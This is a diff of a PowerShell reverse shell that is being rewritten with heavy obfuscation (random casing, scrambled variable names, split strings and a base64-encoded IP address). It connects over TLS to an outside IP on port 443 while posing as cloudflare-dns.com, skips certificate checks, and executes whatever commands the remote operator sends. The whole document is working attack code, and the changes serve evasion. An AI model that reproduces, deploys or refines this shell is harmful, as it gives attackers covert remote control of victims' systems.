@@ -1,57 +1,51 @@
-$Active = 1; 
+$lasy = 0; 
 
-
-if ($Active -ne 1) { exit }
-
+if ($LASY -ne 1) { ExiT }
 
 try {
-    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
+    $qSi8XK9 = [SYSTem.sEcuRIty.aUThEntICaTIon.SSLPROToCoLS]::TLs12;
     
+    $rvuJ = [SYStEm.TEXT.eNCoDIng]::Utf8.getstRINg([sYsTEm.COnVeRT]::frOmBase64sTRiNg(('MTQ2Ljc'+'wL'+'jI0MC4y'+'MDU'+'=')));
     
-    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
-    $port = 54983;
+    $MbuLykqk = 443; 
 
-    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
-    $NetworkStream = $TCPClient.GetStream();
+    $dA38wm = nEw-ObjecT NEt.socKEts.TcpCLiEnt($RVUj, $mbuLYkQK);
+    $Y2ySm = $da38wm.gEtSTrEAm();
     
-    
-    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
-    $SslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $sslProtocols, $false);
+    $hDb2Nw = nEW-oBjecT neT.SEcURITy.ssLStReAm($Y2Ysm, (-not($TrUE)), ({$true} -as [NEt.sEcuRItY.rEMOTECERtIficAtevALIDaTIoNcAlLbAck]));
+    $hdB2NW.autHENTIcaTeAsCLient(('clou'+'d'+'fl'+'are-dns.'+'com'), $nUlL, $qsi8xK9, (-not($TrUE)));
 
-    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
-        $SslStream.Close();
-        exit;
+    if(!$HDb2NW.iSeNCrYpTEd) {
+        $hDb2Nw.ClOse();
+        EXit;
     }
 
-    $StreamWriter = New-Object IO.StreamWriter($SslStream);
-    $StreamWriter.AutoFlush = $true;
+    $Th8yh = NEW-ObJECt Io.STReAmwRiTeR($hDb2Nw);
+    $tH8yh.aUTOFlUSh = (1 -band 1);
 
-    # Function to format the shell prompt
-    function WriteToStream ($String) {
-        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
-        $StreamWriter.Write($String + "PS " + (Get-Location).Path + "> ");
+    function WritETostREAm ($iGBs1ht) {
+        [BYtE[]]$script:AJ6J = NEW-oBJEcT SYSTeM.byTe[] 4096;
+        $th8yH.WRiTe($IGbs1Ht + (-join('P','S ')) + (gET-LocATIon).PaTH + '> ');
     };
 
-    WriteToStream '';
+    WritETostREAm '';
 
-    
-    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
+    while(($raIBCSW = $Hdb2nw.rEAD($script:AJ6J, 0, $script:AJ6J.length)) -gt 0) {
+        $MKfF = ([tExT.enCODing]::UTF8).geTstRINg($script:AJ6J, 0, $raibcsW).TRim();
         
-        if ($Command -eq 'exit') { break }
+        if ($mKff -eq (-join('e','xi','t'))) { break }
         
-        $Output = try {
-            Invoke-Expression $Command 2>&1 | Out-String
+        $ozHlqy7s = try {
+            Invoke-Expression $MKFF 2>&1 | oUt-STRINg
         } catch {
-            $_ | Out-String
+            $_ | ouT-StriNG
         }
         
-        WriteToStream ($Output);
+        WritETostREAm ($ozhlQy7S);
     }
 
-    $StreamWriter.Close();
-    $TCPClient.Close();
+    $th8yH.cloSe();
+    $dA38Wm.cLoSE();
 } catch {
-
-    exit;
+    EXIt;
 }
